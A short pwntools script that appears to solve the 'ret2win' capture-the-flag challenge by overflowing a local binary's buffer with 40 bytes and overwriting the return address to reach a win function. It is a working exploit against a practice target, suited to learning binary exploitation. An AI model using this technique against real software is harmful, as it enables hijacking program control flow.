from pwn import *

r = process("./ret2win")
payload = b'A'*40 +p64(0x40053e)+ p64(0x400756)
r.sendline(payload)
r.interactive()